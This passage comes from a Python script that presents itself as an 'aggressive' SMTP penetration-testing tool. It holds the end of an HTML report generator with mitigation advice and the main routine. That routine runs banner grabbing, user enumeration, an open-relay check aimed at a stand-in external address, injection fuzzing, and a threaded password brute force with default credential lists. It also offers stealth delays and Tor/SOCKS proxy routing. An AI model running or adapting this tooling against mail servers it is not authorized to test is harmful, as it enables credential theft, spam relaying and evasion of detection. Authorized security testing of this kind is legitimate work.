                <ul>{''.join([f'<li>{rec}</li>' for rec in results.get('dane', {}).get('tlsa_records', [])]) or '<li>None.</li>'}</ul>
                <p><strong>Notes:</strong></p>
                <ul>{''.join([f'<li>{note}</li>' for note in results.get('dane', {}).get('notes', [])]) or '<li>No specific notes.</li>'}</ul>
            </div>
        """

    html_content += f"""
            <div class="section">
                <h2>IX. Timing Analysis Visualizations</h2>
                <p>Visual representation of response times captured during specific tests, highlighting potential anomalies. (Requires matplotlib for generation)</p>
        """
    # Embed images as base64 or link them
    timing_graphs = [
        ("rcpt_timing.png", "RCPT TO Response Times"),
        ("bruteforce_timing.png", "Brute Force Response Times") # Add other plots here
    ]
    for img_file, img_title in timing_graphs:
        if PLOTTING_AVAILABLE:
            try:
                import base64
                with open(img_file, "rb") as image_file:
                    encoded_string = base64.b64encode(image_file.read()).decode('utf-8')
                    html_content += f"""
                        <div class="image-container">
                            <h3>{img_title}</h3>
                            <img src="data:image/png;base64,{encoded_string}" alt="{img_title}">
                        </div>
                    """
            except FileNotFoundError:
                html_content += f"<p><em>{img_file} graph file ({img_file}) not found.</em></p>"
            except Exception as e:
                html_content += f"<p><em>Error embedding {img_file}: {e}</em></p>"
        else:
             html_content += f"<p><em>{img_file} graph requires matplotlib, which is not installed.</em></p>"

    html_content += f"""
            </div>
            <div class="section">
                <h2>X. Mitigation Recommendations (2025 Aggressive Edition)</h2>
                <ul>
                    <li><strong>Strict Access Control & Segmentation:</strong> Implement granular ACLs at firewalls. Isolate SMTP servers in a well-defined DMZ or hardened network segment.</li>
                    <li><strong>Mandatory TLS/SSL Enforcement:</strong> Enforce strong TLS encryption (TLS 1.2/1.3 only, no weaker ciphers) for _all_ connections. Implement MTA-STS and DANE for domain-level TLS enforcement and authenticity.</li>
                    <li><strong>Intelligent User Enumeration Prevention:</strong> Disable VRFY and EXPN. For RCPT TO, enforce strict rate limiting and differentiate between valid/invalid users by returning _identical_ error messages/response times for non-existent users (no timing side-channels).</li>
                    <li><strong>Robust Authentication & Brute Force Mitigation:</strong> Require strong, complex passwords and multi-factor authentication (MFA). Implement aggressive account lockout policies, IP blacklisting for repeated failures, and deploy credential stuffing prevention mechanisms.</li>
                    <li><strong>Zero Tolerance for Open Relays:</strong> Configure SMTP servers to _strictly_ deny relaying for unauthenticated or unauthorized users, particularly from internal to external and external to external domains.</li>
                    <li><strong>Advanced Input Validation & Smuggling Prevention:</strong> Implement stringent input validation for all SMTP commands and arguments to prevent injection, overflow, and smuggling attacks. Conduct regular code reviews and dynamic application security testing (DAST).</li>
                    <li><strong>Adaptive Rate Limiting & Throttling:</strong> Apply dynamic and statistical rate limiting based on observed behavior (e.g., using AI anomaly detection) across all relevant SMTP commands (HELO, MAIL FROM, RCPT TO, AUTH). Implement exponential backoff for suspicious traffic.</li>
                    <li><strong>Threat Intelligence & Anomaly Detection (AI-Driven):</strong> Deploy IDPS, WAFs, and SIEM solutions with AI/ML capabilities to continuously monitor SMTP traffic for anomalous behavior, known attack signatures, and brute-force patterns. Integrate with real-time threat intelligence feeds.</li>
                    <li><strong>Regular Patching & Configuration Audits:</strong> Keep all SMTP server software, operating systems, and dependencies patched to the latest, most secure versions. Conduct frequent security configuration audits against hardening baselines.</li>
                    <li><strong>DMARC, DKIM, SPF (Comprehensive Implementation):</strong> Fully implement, monitor, and enforce DMARC, DKIM, and SPF records to prevent email spoofing, phishing, and to ensure legitimate email deliverability.</li>
                    <li><strong>Robust Logging & Alerting:</strong> Enable verbose logging on the SMTP server and configure real-time alerts for all suspicious activities (e.g., repeated failed logins, unusual command sequences, high connection rates from single IPs, non-standard commands).</li>
                    <li><strong>Cloud Environment Best Practices:</strong> If hosted in cloud, implement least-privilege for API access, secure configuration of cloud SMTP services (e.g., AWS SES policies), and continuous monitoring for cloud-specific misconfigurations.</li>
                </ul>
            </div>
            <div class="footer">
                <p>This report contains sensitive findings. Handle with care and prioritize remediation efforts.</p>
                <p>© 2025 SMTPAgressivePentest</p>
            </div>
        </div>
    </body>
    </html>
    """
    with open(report_filename, 'w') as f:
        f.write(html_content)
    logging.info(f"Report generated: {report_filename}")
    print(f"\n[+] Comprehensive HTML report generated: {report_filename}")
    return report_filename

# --- Main Function ---
def main():
    parser = argparse.ArgumentParser(description="Aggressive SMTP Pentest Script - 2025 Edition",
                                     formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("target", help="Target SMTP server IP or hostname")
    parser.add_argument("--port", type=int, default=25,
                        help="SMTP port (default: 25. Use 465 for SMTPS, 587 for Submission with STARTTLS)")
    parser.add_argument("--users_file", default=None, help="File with list of usernames (one per line)")
    parser.add_argument("--passwords_file", default=None, help="File with passwords (one per line)")
    parser.add_argument("--from_email", default=None,
                        help="Comma-separated list of FROM email addresses for open relay/RCPT tests.\n"
                             "(e.g., attacker@example.com,internal@target.com)")
    parser.add_argument("--to_email", default="external.recipient@evilexample.com",
                        help="Comma-separated list of EXTERNAL TO email addresses for open relay check.\n"
                             "(e.g., victim@external.com,backup@external.org)")
    parser.add_argument("--expn_lists", default="staff,admin,support,postmaster,noreply,info",
                        help="Comma-separated list of mailing list names for EXPN enumeration (e.g., staff,admin)")
    parser.add_argument("--domains", default=None,
                        help="Comma-separated list of target domains for RCPT TO enumeration (e.g., target.com,internal.target.com).\n"
                             "Defaults to target hostname.")
    parser.add_argument("--tls", action="store_true",
                        help="Force TLS/STARTTLS connection where possible.")
    parser.add_argument("--nmap", action="store_true",
                        help="Run Nmap scripts (requires nmap installed and in PATH)")
    parser.add_argument("--workers", type=int, default=10,
                        help="Number of concurrent workers for brute force (default: 10)")
    parser.add_argument("--fast", action="store_true",
                        help="Use faster delays for quick scans (less stealthy, more aggressive).\n"
                             "Overrides AI-driven dynamic delays to some extent.")
    parser.add_argument("--no_ai", action="store_true",
                        help="Disable AI-driven anomaly detection and adaptive delays.")
    parser.add_argument("--no_plot", action="store_true",
                        help="Disable generation of timing analysis graphs.")
    parser.add_argument("--proxy", default=None,
                        help="Proxy to use for all connections (e.g., socks5://127.0.0.1:9050 or http://127.0.0.1:8080).\n"
                             "Requires PySocks for SOCKS proxies.")
    args = parser.parse_args()
    # Apply fast/slow attack settings
    if args.fast:
        global current_attack_delay_min, current_attack_delay_max, current_burst_delay
        current_attack_delay_min = 0.05
        current_attack_delay_max = 0.2
        current_burst_delay = 0.01
        print("[*] 'Fast' mode enabled. Attack delays set to aggressive low values.")
    # Apply AI/Plotting settings
    global ML_AVAILABLE, PLOTTING_AVAILABLE
    if args.no_ai:
        ML_AVAILABLE = False
        print("[*] AI anomaly detection disabled by user request.")
    if args.no_plot:
        PLOTTING_AVAILABLE = False
        print("[*] Timing graph plotting disabled by user request.")
    # Configure proxy
    if args.proxy:
        if not SOCKS_AVAILABLE:
            print("[!] PySocks not installed. Proxy support will be disabled.")
        else:
            try:
                proxy_match = re.match(r"(socks5|http)://([\w\d\.]+):(\d+)", args.proxy)
                if proxy_match:
                    PROXY_SETTINGS['type'] = proxy_match.group(1)
                    PROXY_SETTINGS['host'] = proxy_match.group(2)
                    PROXY_SETTINGS['port'] = int(proxy_match.group(3))
                    print(f"[+] Proxy configured: {PROXY_SETTINGS['type']}://{PROXY_SETTINGS['host']}:{PROXY_SETTINGS['port']}")
                else:
                    print("[-] Invalid proxy format. Use socks5://host:port or http://host:port.")
            except Exception as e:
                print(f"[-] Error parsing proxy setting: {e}")
    # Load lists from files or use robust defaults
    users = ["admin", "test", "webmaster", "postmaster", "root", "guest", "info", "support", "sales"] # Default users
    if args.users_file:
        try:
            with open(args.users_file, 'r') as f:
                users = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Users file '{args.users_file}' not found. Using default users.")
    passwords = ["password", "123456", "admin", "test", "changeit", "welcome", "user"] # Default passwords
    if args.passwords_file:
        try:
            with open(args.passwords_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Passwords file '{args.passwords_file}' not found. Using default passwords.")
    from_emails_list = [e.strip() for e in args.from_email.split(',')] if args.from_email else ["attacker@example.com", f"admin@{args.target.split('.')[-2]}.{args.target.split('.')[-1] if len(args.target.split('.')) > 1 else 'com'}"]
    to_emails_list = [e.strip() for e in args.to_email.split(',')] if args.to_email else ["external.recipient@evilexample.com"]
    expn_lists = [l.strip() for l in args.expn_lists.split(',')]
    target_domains_for_rcpt = [d.strip() for d in args.domains.split(',')] if args.domains else [args.target]
    results: Dict[str, Any] = {
        'target': args.target, 'port': args.port, 'initial_tls_request': args.tls,
        'successful_logins': [], 'valid_users_vrfy': [], 'valid_users_rcpt': [],
        'ehlo_extensions': [], 'injection_fuzzing_logs': [], 'open_relay': False,
        'cve_findings': [], 'nmap_output': None, 'cloud_provider': None,
        'mta_sts': None, 'dane': None, 'rcpt_timing_data': {}, 'bruteforce_timing_data': {}
    }
    print("\n" + "="*70)
    print(f"[*] Starting AGGRESSIVE SMTP Penetration Test - 2025 Edition for: {args.target}:{args.port}")
    print("="*70 + "\n")
    # --- Step 0: Initial Information Gathering ---
    print("\n===== Step 0.1: Banner Grabbing =====")
    results['banner'] = banner_grabbing(args.target, args.port)
    print("\n===== Step 0.2: ESMTP Capability Discovery (EHLO, STARTTLS) =====")
    starttls_supported, ehlo_extensions = check_starttls(args.target, args.port)
    results['starttls_supported'] = starttls_supported
    results['ehlo_extensions'] = ehlo_extensions
    if NETWORK_EXTRAS_AVAILABLE:
        print("\n===== Step 0.3: Cloud/SaaS Provider Identification =====")
        results['cloud_provider'] = identify_cloud_smtp_provider(args.target)
        if results['cloud_provider']:
            print(f"[+] Target identified as potentially hosted by: {results['cloud_provider']}")
            print("[*] Note: Cloud SMTP often relies more on API security, which is beyond this tool's scope.")
        else:
            print("[-] Target not identified as a known cloud/SaaS SMTP provider.")
    # --- Step 1: Nmap Scanning ---
    if args.nmap:
        print("\n===== Step 1: Advanced Nmap Scanning =====")
        results['nmap_output'] = nmap_scan(args.target, args.port)
    # --- Step 2: User Enumeration ---
    print("\n===== Step 2.1: User Enumeration (VRFY) =====")
    results['valid_users_vrfy'] = user_enumeration_vrfy(args.target, users, args.port)
    print("\n===== Step 2.2: User Enumeration (EXPN) =====")
    results['expn_results'] = user_enumeration_expn(args.target, expn_lists, args.port)
    print("\n===== Step 2.3: Advanced User Enumeration (RCPT TO with Timing Analysis) =====")
    valid_users_rcpt, rcpt_timing_data = user_enumeration_rcpt(args.target, users, target_domains_for_rcpt, from_emails_list[0], args.port)
    results['valid_users_rcpt'] = valid_users_rcpt
    results['rcpt_timing_data'] = rcpt_timing_data
    # --- Step 3: Open Relay & Command Vulnerabilities ---
    print("\n===== Step 3.1: Aggressive Open Relay Check =====")
    results['open_relay'] = check_open_relay_aggressive(args.target, from_emails_list, to_emails_list, args.port)
    print("\n===== Step 3.2: SMTP Command Injection & Fuzzing =====")
    results['injection_fuzzing_logs'] = test_smtp_injection_fuzzing(args.target, args.port)
    # --- Step 4: Authentication Brute Force ---
    print("\n===== Step 4: Aggressive Brute Force Attack =====")
    successful_logins, bruteforce_timing_data = brute_force_aggressive(args.target, args.port, users, passwords, args.tls, args.workers)
    results['successful_logins'] = successful_logins
    results['bruteforce_timing_data'] = bruteforce_timing_data
    # --- Step 5: Modern Protocol Checks (MTA-STS, DANE) ---
    if NETWORK_EXTRAS_AVAILABLE:
        print("\n===== Step 5.1: MTA-STS Compliance Check =====")
        results['mta_sts'] = check_mta_sts(target_domains_for_rcpt[0]) # Use primary domain
        print("\n===== Step 5.2: DANE (TLSA) Compliance Check =====")
        results['dane'] = check_dane(args.target, args.port)
    # --- Step 6: CVE Specific Findings ---
    print("\n===== Step 6: CVE Specific Findings =====")
    results['cve_findings'] = _check_known_cves(
        results['banner'],
        results['ehlo_extensions'],
        results['open_relay'],
        results['injection_fuzzing_logs']
    )
    if results['cve_findings']:
        print(f"[+] Found {len(results['cve_findings'])} potential CVE/weakness matches.")
    else:
        print("[-] No direct CVE/weakness matches found based on collected info.")
    print("\n===== Generating Final Report =====")
    # --- Step 7: Generate Visualizations ---
    if PLOTTING_AVAILABLE and not args.no_plot:
        plot_timing_results(results['rcpt_timing_data'], "RCPT TO Response Times Analysis", "rcpt_timing.png")
        plot_timing_results(results['bruteforce_timing_data'], "Brute Force Response Times Analysis", "bruteforce_timing.png")
    # --- Step 8: Generate HTML Report ---
    report_file_path = generate_report(results, args.target)
    print(f"\n[*] Penetration Test Completed. Comprehensive HTML Report saved to: {report_file_path}")
    print("[*] Check 'smtp_pentest.log' for detailed logs and raw responses.")
    print("="*70)
if __name__ == '__main__':
    print("!!! WARNING: This script performs aggressive penetration testing. !!!")
    print("!!! ONLY USE THIS SCRIPT ON SYSTEMS YOU ARE LEGALLY AUTHORIZED TO TEST AND HAVE WRITTEN PERMISSION FOR. !!!")
    print("!!! UNAUTHORIZED USE IS ILLEGAL AND CAN LEAD TO SEVERE CONSEQUENCES, INCLUDING IMPRISONMENT. !!!")
    print(">>> By proceeding, you confirm you have explicit, documented permission to test the target. <<<")
    # Simple prompt to ensure user acknowledges the warning before running main logic
    # input("Press Enter to continue or Ctrl+C to abort...")
    main()
